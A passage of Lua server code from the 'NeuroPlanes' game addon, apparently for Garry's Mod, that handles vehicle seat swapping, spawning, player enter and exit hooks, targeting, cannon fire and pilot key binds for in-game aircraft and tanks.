local NeuroPlanesVersion = Revision()
local Authors = "Hoffa, StarChick971, Sillirion, Aftokinito"
local Contributors = "Fireking552, Flyboi, Inaki, Sakarias88, Beat the Zombie, Braxen, Professor Heavy, The Vman, Killstr3aKs"
local Testers = "Virus, Elenion, Flubbadoo, xXAcePilotXx, (WEED)Kamikaze, Pimmie, Rifleman"

function AddDir(dir) -- recursively adds everything in a directory to be downloaded by client
	
	
	-- local list = file.FindDir("../"..dir.."/*")
	-- for _, fdir in pairs(list) do
		-- if fdir != ".svn" then -- don't spam people with useless .svn folders
			-- AddDir(fdir)
		-- end
	-- end
 
	-- for k,v in pairs(file.Find("../"..dir.."/*")) do
		-- resource.AddFile(dir.."/"..v)
	-- end
end
	
AddCSLuaFile("autorun/client/JetHUD.lua")
AddCSLuaFile("autorun/client/C_NeuroTecGlobal.lua")
AddCSLuaFile("autorun/client/NeuroplanesGlobal.lua")
AddCSLuaFile("autorun/client/neurotec_spawntab.lua")
AddCSLuaFile("autorun/client/NeuroTecMenu.lua")
AddCSLuaFile("autorun/special_effects.lua")
AddCSLuaFile("autorun/np_enum.lua")

resource.AddFile("particles/")

-- resource.AddFile("materials/particles/fatsmoke.vtf")
-- resource.AddFile("materials/effects/GAU-8_MuzzleSmoke.vtf")
-- resource.AddFile("sound/ah64fire.wav")
-- resource.AddFile("models/h500_gatling.mdl")
CreateConVar("neurotec_disablemenu", 0, FCVAR_ARCHIVE )
CreateConVar("warthunder_controls", 1, FCVAR_ARCHIVE )


concommand.Add( "neurotec_swapseat", function( ply, cmd, args )
	
	local tank = ply:GetScriptedVehicle()
	local seat = ply:GetVehicle() or tank
	local seatparent = NULL
	if( IsValid( seat ) ) then
		
		seatparent = seat:GetParent()
		
		if( IsValid( seatparent ) && IsValid( seatparent:GetParent() ) && seatparent:GetParent().ValidSeats ) then
			
			seatparent = seatparent:GetParent() -- if we select a copilot seat thats parented to the tower the field ValidSeats wont exist
		
		end
		
	else
		
		if( tank.VehicleType == VEHICLE_HELICOPTER ) then
		
			seatparent = tank
			
		end
			
	
	end
	-- print( type( tonumber( args[1]) ) )
	if( IsValid( seatparent ) && seatparent.ValidSeats ) then
		
		local seatnumber = tonumber(args[1])
		
		if ( seatnumber != nil && type(seatnumber) == "number" && seatnumber <= #seatparent.ValidSeats  ) then
				
			local NewSeat = seatparent.ValidSeats[seatnumber][1]
			
			
			if( NewSeat:GetClass() == "prop_vehicle_prisoner_pod" && !IsValid( NewSeat:GetDriver() ) ) then
					-- print("HARAM")
				
				if( IsValid( tank )  ) then
						
					if( tank.TankType ) then
					
						tank:TankExitVehicle()
					
					elseif( tank.VehicleType && tank.VehicleType == VEHICLE_HELICOPTER ) then
						
						-- tank.Pilot = NULL
						tank:HeloEjectPilotSpecial()
						
					end
					
				end
				
				local s = seatparent.ValidSeats[seatnumber][1]
				
				local wep = ply:GetActiveWeapon()
				
				ply:ExitVehicle()
				ply:EnterVehicle( s )
				
				 if ( s.isChopperGunnerSeat && !IsValid( s.MountedWeapon ) ) then
			
					ply:SetAllowWeaponsInVehicle( true )
					ply:DrawViewModel( true )
					ply:DrawWorldModel( true )
					ply:SetActiveWeapon( wep )
					
				end
				
			elseif( NewSeat.VehicleType != nil && !IsValid( NewSeat.Pilot ) ) then
				-- print("HARAM")
				if( IsValid( tank ) ) then
					
					if( tank.TankType ) then
					
						tank:TankExitVehicle()
					
					elseif( tank.VehicleType && tank.VehicleType == VEHICLE_HELICOPTER ) then
							
						tank:HeloEjectPilotSpecial()
						
					end
					
				end
				
				ply:ExitVehicle()
				seatparent.ValidSeats[seatnumber][1]:Use( ply, ply, 0, 0 )
	
			end
			
			
		end
		
	end
	
end )

concommand.Add("ntespv",function( ply, cmd, args ) 
	
	if( GetConVarNumber( "neurotec_disablemenu", 0 ) > 0 && !a( ply )) then return end
	if( !ply:OnGround() && ply:GetMoveType() != MOVETYPE_NOCLIP ) then ply:PrintMessage( HUD_PRINTCENTER, "NOPE" ) return end
	
	if( IsValid( ply:GetScriptedVehicle() )  || IsValid( ply:GetVehicle() ) ) then
		
		ply:PrintMessage( HUD_PRINTCENTER, "You can't do that right now." )
		
		return
		
	end
	
	for k, v in pairs( scripted_ents.GetSpawnable( ) )  do
		
		if( string.lower(v.ClassName) ==  string.lower(args[1]) ) then
			
			if( v.AdminSpawnable == true && v.Spawnable == false && !ply:IsAdmin() ) then return end
			if( v.NeuroAdminOnly && !ply:IsAdmin() ) then return end
			
			local pos =  ply:GetPos() + Vector(0,0,80) 
			
			if( !v.VehicleType && !v.HealthVal ) then
				
				local tr = ply:GetEyeTrace()
				pos = tr.HitPos + tr.HitNormal * 80
			
			end
		
			ply:SetPos( ply:GetPos() + Vector( 0,0,150 ) )
			
			local ride = ents.Create( v.ClassName )
			ride:SetPos( pos )
			ride:SetAngles( Angle( 0,ply:GetAngles().y, 0 ) )
			ride:Spawn()
			
			
			if( v.VehicleType ) then
				
				if( v.TankType ) then
				
					timer.Simple( 0.5, function()
						
						if( IsValid( ply ) && ply:Alive() && IsValid( ride ) ) then
						
							ride:Use( ply, ply, 0, 0 )
							
						end
					
					end )
				
				else
					
					ride:Use( ply, ply, 0, 0 )		
				
				end
				
				
			end
			
			undo.Create( v.PrintName )
			 undo.AddEntity( ride )
			 undo.SetPlayer( ply )
			undo.Finish()
		end
		
	end
	
end )
local CrashDebris = {
					{"models/props_citizen_tech/Firetrap_PropaneCanister01a.mdl"};
					{"models/props_junk/iBeam01a.mdl"};
					-- {"models/props_combine/tprotato2_chunk04.mdl"};
					-- {"models/props_wasteland/barricade001a_chunk05.mdl"};
					{"models/props_wasteland/gear02.mdl"};
					{"models/props_c17/playground_teetertoter_stan.mdl"};
					{"models/props_vehicles/carparts_muffler01a.mdl"};
					-- {"models/props_c17/canisterchunk01a.mdl"};
					{"models/props_c17/utilityconnecter006c.mdl"};
					{"models/props_debris/metal_panelshard01d.mdl"};
					{"models/props_c17/TrapPropeller_Engine.mdl"};
					{"models/props_debris/beam01a.mdl"};
					{"models/props_debris/beam01b.mdl"};
					-- {"models/props_debris/metal_panelchunk01f.mdl"};
					-- {"models/props_debris/metal_panelchunk01e.mdl"};
					}

for k, v in pairs( CrashDebris ) do

	util.PrecacheModel( tostring(v) )
	
end

CreateConVar("jet_funstuff", 0,  FCVAR_NOTIFY )
CreateConVar("jet_coloredtrails", 0, FCVAR_NOTIFY )

local t = CurTime()
local function FixHealth() -- Hackfix
	
	if ( t + 0.5 > CurTime() ) then
		
		return
		
	end
	
	t = CurTime()
	
	for k,v in pairs( ents.GetAll() ) do
		
		if ( v.HealthVal ) then
			
			if ( v:GetNetworkedInt( "health", 0 ) == v.HealthVal ) then
				---- no need to update the variable if its already set.
				return
				
			end
			
			if ( v.HealthVal < 0 ) then
			
				v.HealthVal = 0
			
			end
			
			v:SetNetworkedInt( "health", v.HealthVal )
			
		end
		
	end
	
	for k,v in pairs( player.GetAll() ) do
		
		if(  !IsValid( v:GetVehicle() ) && v:GetNetworkedBool("NeuroPlanes__DrawAC130Overlay", false) ) then
		
			v:SetNetworkedBool( "NeuroPlanes__DrawAC130Overlay", false )
	
		end
		
		if( !v:GetNetworkedBool("InFlight", false ) ) then
				
			if( v:GetNetworkedBool( "DrawPhalanxHUD", false ) ) then
			
				v:SetNetworkedBool( "DrawPhalanxHUD", false )
			
			end

		end
		

	end
	
	-- Misc funstuff
	
	NEUROPLANES_CINEMATIC_ROCKET = ( GetConVarNumber("jet_funstuff") > 0 )
	WERE_BACK_IN_THE_70s_BABY = ( GetConVarNumber("jet_coloredtrails") > 0 )
	
end
hook.Add("Think","NeuroPlanes____CorrectHealthValues",FixHealth)

-- hook.Add("PlayerSpawn", "FixColor", function( ply )
	
	-- ply:SetColor( Color( 255,255,255,255 ) )
	
-- end ) 

if( table.HasValue( hook.GetTable(), "FixGhostCollisionModels" ) ) then
	
	hook.Remove( "PlayerSpawnedSENT", "FixGhostCollisionModels" )

end
	
hook.Add( "PlayerSpawnedSENT", "FixGhostCollisionModels", function( ply, e )
	
	local mats = e:GetMaterials()
	
	if( e.InitialHealth && table.HasValue( mats, "___error" ) ) then
		
		e:SetSkin( 0 )
		
	end
	
	-- if( e.VehicleType ) then
	
		-- e.UpdateTransmitState = function() return TRANSMIT_ALWAYS  end
		
	-- end
	
	for k,v in pairs( ents.GetAll() ) do 
		
		if( IsValid( v ) && v != e && v:GetParent() == e && e.VehicleType != nil ) then
			
			v:SetMoveType( MOVETYPE_NONE )
			v:SetSolid( SOLID_NONE )
			
		end
		
	end	

end )

hook.Add( "PhysgunPickup", "physgunPickup", function( ply, ent ) if ( ent.isTouching != nil || ent.IsFlying || ent.IsDriving || IsValid( ent.Pilot ) ) then return false end end )

hook.Add("PlayerEnteredVehicle","NeuroPlanes_OnEnterVehicle", function( player, vehicle, role ) 
	
	if ( vehicle.isChopperGunnerSeat ) then
		
		player:SetNetworkedBool( "isGunner", false )
		
		if(  IsValid( vehicle.MountedWeapon ) ) then
		
			player:SetNetworkedEntity( "ChopperGunnerEnt", vehicle.MountedWeapon )
			
		else
		
			player:SetAllowWeaponsInVehicle( true )
			player:DrawViewModel( true )
			player:DrawWorldModel( true )
			-- player:EnableCrosshair(false)
		end
			
		-- player:SetFOV( 55, 0.1 )
		
	end
	
	if ( vehicle.IsAC130GunnerSeat ) then
	
		player:SetNetworkedEntity( "NeuroPlanesMountedGun", vehicle.MountedWeapon )
		player:SetNetworkedBool( "NeuroPlanes__DrawAC130Overlay", true )
		player:DrawWorldModel( false )
		--print( 	player:GetNetworkedBool( "NeuroPlanes__DrawAC130Overlay" ) )
		
	end
	
	if( vehicle.IsB17GunnerSeat != nil ) then
		
		player:DrawWorldModel( false )
		player.OldColor = player:GetColor()
		player:SetRenderMode( RENDERMODE_TRANSALPHA )
		player:SetColor( Color( 0,0,0,0 ) )
	
	end
	
	if( vehicle.IsHelicopterCoPilotSeat ) then
		
		player:SetNetworkedBool( "InFlight",true )
		player:SetNetworkedEntity( "Plane", vehicle:GetParent() ) 
		vehicle:GetParent():SetNetworkedEntity( "CoPilot", player )
	
	end
	
	if( type( vehicle.RocketVisuals ) == "table" ) then
		
		local wep = vehicle.EquipmentNames[ self.FireMode ]	
		local wepData = vehicle.RocketVisuals[ wep.Identity ]
			
		vehicle:SetNetworkedString("NeuroPlanes_ActiveWeapon", wep.Name)

	end
	
end )

hook.Add("PlayerDeath", "NeuroPlanes_OnDeath_ResetVariables", function( plr, wep, killer )
	
		plr:SetNetworkedEntity( "ChopperGunnerEnt", NULL )
		plr:SetNetworkedEntity("Plane", NULL )
		plr:SetNetworkedBool( "isGunner", false )
		plr:SetNetworkedBool( "DrawTracker", false )
		plr:SetNetworkedBool( "NeuroPlanes__DrawAC130Overlay", false )
		
end )

hook.Add("PlayerLeaveVehicle","NeuroPlanes_OnLeftVehicle", function( player, vehicle ) 
	
	player:SetColor( Color( 255,255,255, 255 ) )
	
	if ( vehicle.isChopperGunnerSeat ) then
	
		player:SetNetworkedBool( "isGunner", false )
		player:SetNetworkedEntity( "ChopperGunnerEnt", NULL )
		player:SetPos( vehicle:GetPos() + vehicle:GetForward() * 128 )
		-- player:SetFOV( 0, 0.1 )
		
	end
	
	if( vehicle.IsTankCopilotGunnerSeat ) then
	
		player:SetNetworkedEntity("Weapon", NULL )
	
	end
	
	if( vehicle.IsB17GunnerSeat ) then
		
		player:DrawWorldModel( true )
		player:SetRenderMode( RENDERMODE_TRANSALPHA )
		player:SetColor( player.OldColor or Color( 255, 255, 255, 255 ) )
		player:SetPos( vehicle:GetPos() + vehicle:GetRight() * 200 )
		player:SetFOV( player.OriginalFOV, 0.15 )
		player:SetHealth( 100 )
		
	end
	
	if ( vehicle.IsAC130GunnerSeat ) then
		
		-- player:SetNetworkedBool( "NeuroPlanes__DrawAC130Overlay", false )
		player:Spawn()
		player:SetPos( vehicle:GetParent():LocalToWorld( Vector( 60, 0, 53 ) )  )
		player:SetFOV( player.OriginalFOV, 0 )
		player:DrawWorldModel( true )
		player:SetColor( Color( 255,255,255,255 ) )
		player:SetHealth( 100 )
		player:SetNetworkedBool( "NeuroPlanes__DrawAC130Overlay", false )
		
	end
	
	if( vehicle.IsCoPilotSeat ) then
		
		player:SetColor( Color( 255, 255, 255, 255 ) )
		vehicle:GetParent().CoPilot = NULL

	end
	
	if( vehicle.IsHelicopterCoPilotSeat ) then
		
		player:SetNetworkedBool( "DrawDesignator", false )
		player:SetNetworkedBool("InFlight",false)
		player:SetNetworkedEntity( "Plane", NULL ) 
		vehicle:GetParent():SetNetworkedEntity( "CoPilot", NULL )
		
		local vp = vehicle:GetParent()
		local pos = vehicle:LocalToWorld( Vector( 200, 200, -30 ) )
		
		if( IsValid( vp ) && vp.Destroyed ) then
			
			pos = vehicle:GetPos() + Vector( 0,100,10 )
			
		end
		
		player:SetPos( pos  ) -- might be safe here
		
	end
	
	if( vehicle.IsB17Seat ) then
	
		player:SetNetworkedEntity( "Neuroplanes_B17_roofturret", NULL )
	
	end
	
	
	if( vehicle.IsPassengerSeat ) then
		
		player:SetNetworkedEntity( "ChopperGunnerEnt", NULL )
		player:SetNetworkedEntity( "NeuroPlanes_Helicopter", NULL )
		player:SetNetworkedBool( "isGunner", false )
		player:SetColor( Color( 255, 255, 255, 255 ) )
		player:Spawn()
		
		local vp = vehicle:GetParent()
		local pilot = vp.Pilot -- LOL
		
		if( IsValid( vp ) && IsValid( pilot ) ) then
			
			if( IsValid( vp.ChopperGun ) ) then
			
				pilot:SetNetworkedEntity("ChopperGunnerEnt", vp.ChopperGun )
				
				vp.GotChopperGunner = false
			
			end
			
		end
		
		player:SetPos( vehicle:GetPos() + vehicle:GetRight() * 110 )
		
	end
	
end )


-- hook.Add("OnNPCKilled", "NeuroPlanes_KillCredit_NPC", function( victim, killer, weapon )
	
	-- if( victim:IsNPC() && victim.HealthVal ) then
		
		-- if ( killer.HealthVal && IsValid( killer.Pilot ) && killer.Pilot:IsPlayer() ) then
			
			-- killer.Pilot:AddFrags( 1 )
			
		-- elseif( killer:IsPlayer() ) then
			
			-- killer:AddFrags( 1 )
		
		-- end
	
	-- end
	
-- end )


-- hook.Add( "EntityTakeDamage", "NeuroPlanes_KillCredit_Plane", function( ent, inflictor, attacker, amount, dmginfo )
	
	-- if( ent.HealthVal && !ent:IsNPC() ) then
		
		-- if( ent.HealthVal > 0 && amount > ent.HealthVal ) then
			
			-- if( attacker:IsPlayer() ) then
				
				-- attacker:AddFrags( 1 )
				
			-- elseif( IsValid( attacker.Pilot ) && attacker.Pilot:IsPlayer() ) then
				
				-- attacker.Pilot:AddFrags( 1 )
			
			-- end
		
		
		-- end
	
	
	-- end

-- end )

hook.Add( "OnEntityCreated", "NeuroPlanes_EntCreatedHook", function( ent ) 
	
	timer.Simple( 1, 
	function()
	
		if( IsValid( ent ) ) then
		
			if( ent.FlareCount ) then
				
				ent:SetNetworkedInt( "FlareCount", ent.FlareCount )
			
			end
			
		end
		
	end )
	
end )


local Meta = FindMetaTable("Entity")

function Meta:NA_RPG_damagehook(dmginfo)

	if( !self.HealthVal ) then self.HealthVal = 100 end 
  	if( self.HealthVal < 0 ) then return end
	
	if( !IsValid( self ) ) then return end
	
	self:TakePhysicsDamage( dmginfo )
	
	self.HealthVal = self.HealthVal - dmginfo:GetDamage()

	if ( self.HealthVal < 0 ) then
		
		-- make a big explosion
		ParticleEffect( "ap_impact_wall", self:GetPos(), self:GetAngles(), nil )
		-- makes metal sound + flash effect
		local fx = EffectData()
		fx:SetOrigin( self:GetPos() )
		fx:SetScale( 1 )
		util.Effect( "RPGShotDown", fx )
		
		local inertjunk = ents.Create("prop_physics")
		inertjunk:SetPos( self:GetPos() )
		inertjunk:SetAngles( self:GetAngles() )
		inertjunk:SetModel( self:GetModel() )
		inertjunk:SetSkin( self:GetSkin() )
		inertjunk:Spawn()
		local jphys = inertjunk:GetPhysicsObject()
		local mphys = self:GetPhysicsObject()
		jphys:SetVelocity( mphys:GetVelocity() )
		jphys:AddAngleVelocity( VectorRand() * 50 )
		
		if( IsValid( self.Owner ) ) then
			
			inertjunk:SetPhysicsAttacker( self.Owner )
			inertjunk:SetOwner( self.Owner )
		
		end
		
		inertjunk:Fire("kill","",math.random(8,10))
		
		util.BlastDamage( self, self, self:GetPos(), 512, math.random( 75, 95 ) )
		self:Remove()
		
		return
		
	end
	
end

function Meta:RotorTrash()
	
	if true then return end -- borked
	
	if ( math.random( 1,5 ) == 5 ) then
		
		for i=1,3 do
			
			local fx = EffectData()
			fx:SetOrigin( self:GetPos() + self:GetRight() * ( 512 - ( 100 * i  ) ) )
			fx:SetScale( 2 )
			util.Effect( "part_dis", fx )
			
		end
		
		for j=1,3 do
		
			local fx = EffectData()
			fx:SetOrigin( self:GetPos() + self:GetForward() * ( 512 - ( 100 * j  ) ) )
			fx:SetScale( 2 )
			util.Effect( "part_dis", fx )
		
		end
		 
		-- local p = { 
					-- "models/props_wasteland/wood_fence02a_board04a.mdl",
					-- "models/props_wasteland/wood_fence02a_board04a.mdl",
					-- "models/props_wasteland/wood_fence02a_board04a.mdl",
					-- "models/props_wasteland/wood_fence02a_board04a.mdl"
					-- }
							
		self.Owner.Destroyed = true
		self.Owner.Burning = true
		self.Destroyed = true
	
		self:Remove()
	
	end

end

function Meta:PlayWorldSound(snd)

	for k, v in pairs( player.GetAll() ) do
		
		local tr,trace = {}, {}
		tr.start = self:GetPos() + self:GetUp() * -512
		tr.endpos = v:GetPos()
		tr.mask = MASK_SOLID
		tr.filter = self
		trace = util.TraceLine( tr )
	
		if ( trace.HitNonWorld ) then
		
			local norm = ( self:GetPos() - v:GetPos() ):GetNormalized()
			local d = self:GetPos():Distance( v:GetPos() )
			
			if ( DEBUG ) then
			
				debugoverlay.Cross( v:GetPos() + norm * ( d / 10 ), 32, 0.1, Color( 255,255,255,255 ), false )
			
			end
			
			if( d > 4500 ) then
				
--Gmod12		-- WorldSound( snd, v:GetPos() + norm * ( d / 10 ), 211, 100   )
				sound.Play( snd, v:GetPos() + norm * ( d / 10 ), 211, 100   ) -- Crappy Sauce Engine can't handle a couple of hundred meters of sound. Hackfix for doppler effect.
			
			else
			
				self:EmitSound( snd, 211, 100 )
			
			end
			
		end
		
	
	end

end

function Meta:SpawnPilotModel( pos, ang )
	
	if( !pos ) then return end
	
	
	local p = ents.Create("prop_dynamic")
	p:SetModel( self.Pilot:GetModel() )
	p:SetPos( self:LocalToWorld( pos ) )
	p:SetAngles( self:GetAngles() )	
	p:SetSolid( SOLID_NONE )
	p:SetParent( self )
	p:SetKeyValue( "DefaultAnim", "ACT_DRIVE_AIRBOAT" )
	p:SetKeyValue( "disableshadows", 1 )
	p:Spawn()
	p:SetRenderMode( RENDERMODE_TRANSALPHA )
	p:SetColor( Color( 255,255,255,255 ) )
	
	-- print( p )
	
	if( IsValid( p ) ) then
		-- print ( "Valid Pilot Model" )
		return p
	
	end
	
	return NULL
	
end

function Meta:Jet_LockOnMethod()
	
	local filter =  { self.Pilot, self, self.Weapon }
	
	if( IsValid( self.CoPilot ) ) then
		
		filter[#filter+1] = self.CoPilot
	
	end
	-- print("lock me up" )
	-- -- Lock On method
	local trace,tr = {},{}
	tr.start = self:GetPos() + self:GetForward() * 1000
	tr.endpos = tr.start + self:GetForward() * 15500
	tr.filter = filter
	tr.mask = MASK_SOLID
	trace = util.TraceEntity( tr, self )
	-- self:DrawLaserTracer( tr.start, trace.HitPos )
	local e = trace.Entity
	
	local logic = ( IsValid( e ) && ( e.PrintName || e:IsNPC() || e:IsPlayer() || e:IsVehicle() || e.HealthVal != nil ) )
	local logic2 = ( e != self.Pilot )
	
	local NeuroTeam = self:GetNetworkedInt( "NeuroTeam", 0 )
	local TargetTeam = e:GetNetworkedInt( "NeuroTeam", -1 )
	local logic3
	if TargetTeam >= 0 then
	
		logic3 = ( TargetTeam != NeuroTeam )--Don't lock allies
		
	else
	
		logic3 = ( TargetTeam != 0 )
		
	end
	
	if ( logic && logic2 && logic3 && !IsValid( self.Target ) && e:GetOwner() != self && e:GetOwner() != self.Pilot && e:GetClass() != self:GetClass() ) then
		
		if( IsValid( e.TailRotor ) ) then
			
			self:SetTarget( e.TailRotor )
				
			return
			
		end
		
		self:SetTarget( e )
		
	end

end

function Meta:Turret_LockOnMethod()

	-- Lock On method
	local trace,tr = {},{}
	tr.start = self.Weapon:GetPos() + self.Weapon:GetForward() * 1000
	tr.endpos = tr.start + self.Weapon:GetForward() * 15000
	tr.filter = { self.Pilot, self, self.Weapon }
	tr.mask = MASK_SOLID
	trace = util.TraceEntity( tr, self.Weapon )
	
	self:DrawLaserTracer( tr.start, trace.HitPos )
	
	local e = trace.Entity
	
	local logic = ( IsValid( e ) && ( e:IsNPC() || e:IsPlayer() || e:IsVehicle() || e.HealthVal != nil || string.find( e:GetClass(), "prop_vehicle" ) ) )
	local logic2 = ( e != self.Pilot )
	
	if ( logic && logic2 && !IsValid( self.Target ) && e:GetOwner() != self && e:GetOwner() != self.Pilot && e:GetClass() != self:GetClass() ) then
		
		self:SetTarget( e )
		
	end

end

function Meta:CoPilot_Attack()

end

function Meta:Micro_FireCannons()
	
	if( type(self.Miniguns) != "table" ) then return end
	
	self.MinigunIndex = self.MinigunIndex + 1
	
	if( self.MinigunIndex > self.MinigunMaxIndex ) then self.MinigunIndex = 1 end
	
	if( !self.MinigunTracer ) then	
	-- else		
		self.MinigunTracer = "AirboatGunHeavyTracer"	
	end

	-- for i=1,#self.Miniguns do
	
	
	local i = self.MinigunIndex
	local g = self.Miniguns[i]
	if( IsValid( g ) ) then
		
		local bullet = ents.Create( self.AmmoType )
		bullet:SetPos( g:GetPos() + g:GetForward() * 90 )
		bullet:SetAngles( self:GetAngles() )
		bullet.TinyTrail = true
		bullet:Spawn()
		bullet.MinDamage = self.MinDamage
		bullet.MaxDamage = self.MaxDamage
		bullet.Radius = self.Radius
		bullet:SetPhysicsAttacker( self.Pilot )
		bullet:SetOwner( self.Pilot )
		bullet.Owner = self.Pilot
		bullet:GetPhysicsObject():SetMass( 5 )
		bullet:GetPhysicsObject():SetDamping( 0,0 )
		bullet:SetNoDraw( true )
		
		bullet:GetPhysicsObject():SetVelocity( self:GetForward() * 500000 )
		
	end
		
	
	-- end
	
	self.LastPrimaryAttack = CurTime()

end

function Meta:Jet_FireMultiBarrel()
	
	if( type(self.Miniguns) != "table" ) then return end
	
	self.MinigunIndex = self.MinigunIndex + 1
	
	if( self.MinigunIndex > self.MinigunMaxIndex ) then self.MinigunIndex = 1 end
	
	if( self.MinigunTracer ) then	
	else		
		self.MinigunTracer = "AirboatGunHeavyTracer"	
	end

	--for i=1,#self.Miniguns do
	local i = self.MinigunIndex
		
		local bullet = {} 
		bullet.Num 		= 1
		bullet.Src 		= self.Miniguns[i]:GetPos() + self.Miniguns[i]:GetForward() * 120
		bullet.Dir 		= self.Miniguns[i]:GetAngles():Forward()
		bullet.Spread 	= Vector( .0151, .0161, .0171 )
		bullet.Tracer	= self.TracerCount or 1
		bullet.Force	= 5
		bullet.Damage	= math.random( 10, 20 )
		bullet.AmmoType = "Ar2" 
		bullet.TracerName 	= self.MinigunTracer or "HelicopterTracer" -- 
		bullet.Callback    = function ( a, b, c )
		
								local effectdata = EffectData()
									effectdata:SetOrigin( b.HitPos )
									effectdata:SetStart( b.HitNormal )
									effectdata:SetNormal( b.HitNormal )
									effectdata:SetMagnitude( 1 )
									effectdata:SetScale( 1 )
									effectdata:SetRadius( 1 )
								util.Effect( "cball_explode", effectdata )
								
								util.BlastDamage( self, self.Pilot, b.HitPos, 32, math.random( 50, 100 ) )
								
								return { damage = true, effects = DoDefaultEffect } 
								
							end 
		
		if( self.Muzzle ) then
			
			-- print("YEP")
			local sm = EffectData()
			sm:SetStart( self.Miniguns[i]:GetPos() + self.Miniguns[i]:GetForward() * self.MuzzleOffset or 105)
			sm:SetOrigin( self.Miniguns[i]:GetPos() + self.Miniguns[i]:GetForward() * self.MuzzleOffset or 105)
			sm:SetEntity( self.Miniguns[i] )		
			sm:SetAttachment(1)
			sm:SetScale( 0.5 )
			util.Effect( self.Muzzle, sm )

		else
			
			-- print("nope")
			ParticleEffect( "mg_muzzleflash", self.Miniguns[i]:GetPos() + self.Miniguns[i]:GetForward() * self.MuzzleOffset or 105,  self:GetAngles(), self )
		
		end
		

		
		self.Miniguns[i]:FireBullets( bullet )
		
		--self.Miniguns[i]:EmitSound( "npc/turret_floor/shoot"..math.random(2,3)..".wav", 511, 60 )
		
	--end
	
	self.LastPrimaryAttack = CurTime()
	
end

function Meta:SonicBoomTicker()
	--High Speed Sound FX System 
		
	if ( math.floor( self:GetVelocity():Length() ) > ( 1.8 * 1224 * 0.80 ) ) then
		
		self.PCfx = self.PCfx + 0.001
		
		if 	self.PCfx >= 1 then
			
			self.PCfx = 1
		
		end

		self.FXMux[1]:PlayEx( 100 , self.Pitch * self.PCfx )
		
	else
	
		self.PCfx = self.PCfx - 0.01 
		
		if 	self.PCfx <= 0 then
			
			self.PCfx = 0
		
		end
		
		self.FXMux[1]:FadeOut(2)
		
	end
	

	if ( ( math.floor(self:GetVelocity():Length() ) >= (1.8*1224-4)) && 
			( math.floor(self:GetVelocity():Length() ) <= (1.8*1224+16)) ) then
		
		self.FXMux[2]:PlayEx( 500 , 100 )
		
	end

	if ( ( math.floor( self:GetVelocity():Length() ) >= ( 1.8 * 1224 ) ) && 
		 ( math.floor( self:GetVelocity():Length() ) <= ( 1.8 * 1224+96 ) ) && !self.Pilot:KeyDown( IN_BACK ) && self:GetAngles().p < -20 ) then -- Don't want the vapor cloud on deceleration
		
		self.FXMux[3]:PlayEx( 100 , self.Pitch )

		local effectdata = EffectData()
		effectdata:SetStart( self:GetPos() + self:GetForward() * 100 )
		effectdata:SetOrigin( self:GetPos() + self:GetForward() * 100 )
		effectdata:SetEntity( self )
		effectdata:SetScale( 50 )
		effectdata:SetNormal( self:GetForward() )
		util.Effect( "A10_muzzlesmoke", effectdata )
		
	else
	
		self.FXMux[3]:FadeOut(1)
	
	end

end

function Meta:NeuroPlanes_CycleThroughJetKeyBinds()
	
	-- print( "Walla" )
	self:NextThink( CurTime() )
	if ( !self.Pilot || !self.IsFlying ) then
		
		return
		
	end
	
	if ( self.LastAttackKeyDown == nil ) then
		
		self.LastAttackKeyDown = CurTime()
		
	end
	
	if( self.LastFlareKeyDown == nil ) then
		
		self.LastFlareKeyDown = CurTime()
	
	end
	
	if( self.LastUseKeyDown == nil ) then
		
		self.LastUseKeyDown = CurTime()
		
	end
	
	if( IsValid( self.PassengerSeat ) ) then
		
		local d = self.PassengerSeat:GetDriver()
		
		
		if( IsValid( d ) && d:KeyDown( IN_SPEED ) && d:KeyDown( IN_USE ) ) then
			
			self:NeuroPlanes_EjectPlayer( d )
			
			return
			
		end
		
	end

	
	if( self.Pilot:KeyDown( IN_DUCK ) && self.Pilot:KeyDown( IN_SPEED ) && self.Pilot:KeyDown( IN_WALK ) && self.Speed > self.MaxVelocity * 0.6 && !IsValid( self.Wingman ) ) then
		
		self:CreateWingmanNPC()
		
		return 
		
	end
	
	if( self.Pilot:KeyDown( IN_DUCK ) && self.Pilot:KeyDown( IN_SCORE ) ) then
		
		self:NeuroPlanes_EjectionSeat()
		
		return
	
	end
		
	if ( self.Pilot:KeyDown( IN_WALK ) && self.Pilot:KeyDown( IN_USE ) && self.LastUseKeyDown + 3.0 <= CurTime() ) then
		
		self:RemoveRotorwash()
	
		self:NeuroJets_Eject()
		self.LastUseKeyDown = CurTime()
		self.LastUse = CurTime()
		
		return
		
	end	
	-- Clear Target 
	if ( self.Pilot:KeyDown( IN_WALK ) && IsValid( self.Target ) ) then
		
		self:ClearTarget( )
		self.Pilot:PrintMessage( HUD_PRINTTALK, "Target Released" )
		
	end
	
	if( !self.FiringTimer ) then
			
		self.FiringTimer = 0
		self.OverHeated = 0
			
	end
	-- -- Attack
	if ( self.Pilot:KeyDown( IN_ATTACK ) ) then

		if ( self.LastPrimaryAttack + self.PrimaryCooldown <= CurTime() && self.OverHeated + 3 <= CurTime() ) then
			
			if( self.ContigiousFiringLoop ) then
				
				-- if( !self.IsShootSoundPlaying ) then
					
					-- self.IsShootSoundPlaying = true
					
					self.PrimarySound:PlayEx(100,100)
					
				-- end
				
			
			end
			
			self:PrimaryAttack()
			
			if( self.PrimaryCooldown < .5 ) then
		
				self.FiringTimer = self.FiringTimer + 1
		
			end
			
			if( self.FiringTimer >= ( self.PrimaryMaxShots or 25 ) ) then
				
				self.OverHeated = CurTime()
				self.FiringTimer = 0
				self.Pilot:PrintMessage( HUD_PRINTTALK, "Calm down Skippy, your guns are glowing!" )
				self:EmitSound( "npc/dog/dog_pneumatic2.wav",511, 75 )
				if( self.ContigiousFiringLoop ) then
			
					self.PrimarySound:Stop()
	
				end
				
			end

		end
		
	else
	
		if( self.ContigiousFiringLoop ) then
			
			self.PrimarySound:Stop()
	
		end
			
		self.FiringTimer = math.Approach( self.FiringTimer, 0, 1 )
			
	end

	-- print( "???")
	-- Firemode 
	if ( !self.NoSecondaryWeapons && self.Pilot:KeyDown( IN_RELOAD ) && self.LastFireModeChange + 0.5 <= CurTime() ) then
		
		-- if(  ) then
		
			self:CycleThroughWeaponsList()
		
		-- end
		
	end
	
	-- Flares
	if ( self.LastFlare && self.Pilot:KeyDown( IN_JUMP ) && self.FlareCount > 0 && self.LastFlare + self.FlareCooldown <= CurTime() && self.LastFlareKeyDown + 0.5 <= CurTime() ) then
		
		if ( !self.isHovering ) then

			self.LastFlareKeyDown = CurTime()
			self.FlareCount = self.FlareCount - 1
			self:SetNetworkedInt( "FlareCount", self.FlareCount )
			self:SpawnFlare()
			self:EmitSound( "LockOn/Flare.mp3",511,100 )
		
			
